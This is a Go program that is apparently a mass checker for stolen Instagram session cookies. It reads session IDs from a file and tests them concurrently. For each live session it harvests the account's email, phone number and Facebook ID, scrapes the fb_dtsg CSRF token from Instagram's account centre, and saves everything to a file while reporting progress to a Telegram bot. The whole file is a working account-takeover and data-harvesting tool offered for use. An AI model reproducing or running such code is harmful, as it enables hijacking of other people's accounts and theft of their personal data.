package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	bot Bot
)

type User struct {
	Fbid         int64  `json:"fbid_v2"`
	Email        string `json:"email"`
	Phone_number string `json:"phone_number"`
}

type Response struct {
	User   User   `json:"user"`
	Status string `json:"status"`
}

func main() {
	bot.Token, _ = ReadFile("files/token.txt")
	bot.id, _ = ReadFile("files/id.txt")
	id := bot.SendMessage("<b>Starting ...</b>")
	bot.Msgid[0] = regexp.MustCompile(`"message_id":(\d+)`).FindStringSubmatch(string(id))[1]
	time.Sleep(2 * time.Second)
	sessions := make(chan string)
	file, err := os.OpenFile("files/sessions.txt", os.O_RDWR|os.O_CREATE, 0755)
	if err != nil {
		bot.SendMessage("Error opening file")
		os.Exit(1)
	}
	defer file.Close()
	// read sessions from file
	go readSessions(sessions, file)
	// Get Sessions Info
	sessionsInfo := make(chan string)
	// concurrency
	concurrency := 251
	// start goroutines
	var bad int
	var good int
	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			for session := range sessions {
				info := GetSessionInfo(session)
				if info != "" {
					good++
					sessionsInfo <- info
				} else {
					bad++
				}
			}
			wg.Done()
		}()
	}
	// save sessions info to file
	go func() {
		defer close(sessionsInfo)
		defer bot.SendMessage("Finished..")
		file, err := os.OpenFile("files/auto_sessions.txt", os.O_RDWR|os.O_CREATE, 0755)
		if err != nil {
			bot.SendMessage("Error opening auto file")
		}
		for info := range sessionsInfo {
			file.WriteString(info + "\n")
		}
		file.Close()
	}()
	go func() {
		for {
			bot.EditMessage(fmt.Sprintf("\rGood: %d, Bad: %d", good, bad), bot.Msgid[0])
		}
	}()
	wg.Wait()
}

func GetSessionInfo(session string) string {

	req := fastInfo()
	req.Header.Set("Cookie", fmt.Sprint("sessionid=", session))
	resp := fasthttp.AcquireResponse()
	client, _ := ClientHistoryP()
	if err := client.Do(req, resp); err == nil {
		if strings.Contains(string(resp.Body()), `fbid_v2`) {
			var response Response
			if err := json.Unmarshal(resp.Body(), &response); err != nil {
				fmt.Println("Error decoding JSON:", err)
				return ""
			}
			fbid := response.User.Fbid
			email := response.User.Email
			phone_number := response.User.Phone_number
			fbDtsg := GetFbDtsg(session)
			if fbDtsg != "" {
				// save session info
				return fmt.Sprintf("%s|%s|%s|%d|%s", session, fbDtsg, email, fbid, phone_number)
			} else {
				return ""
			}
		} else {
			return ""
		}
	}
	return ""
}

func GetFbDtsg(x string) string {
	var fbDtsg string
	req, err := http.NewRequest("GET", "https://accountscenter.instagram.com/?entry_point=app_settings", nil)
	if err != nil {
		// Handle error
		log.Println("Error creating request:", err)
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)frel Safari/537.36")
	req.Header.Add("Cookie", fmt.Sprintf("sessionid=%s", x))

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		// Handle error
		log.Println("Error sending request:", err)
		return ""
	}

	response, _ := ioutil.ReadAll(res.Body)
	if strings.Contains(string(response), "DTSGInitData") {
		fbDtsg = regexp.MustCompile(`\["DTSGInitData",\[\],.*?"token":"([^"]+)"`).FindStringSubmatch(string(response))[1]
		_ = res.Body.Close()
		return fbDtsg
	} else {
		return ""
	}
}
func readSessions(sessions chan string, file *os.File) {
	// read sessions from file
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		if err := sc.Err(); err != nil {
			log.Fatal(err)
		}
		if sc.Text() != "" {
			sessions <- sc.Text()
		}
	}
	close(sessions)
}

func ReadFile(filename string) (string, error) {
	file, err := ioutil.ReadFile(filename)
	if err != nil {
		os.Create(filename)
		return "", err
	}
	return string(file), nil
}
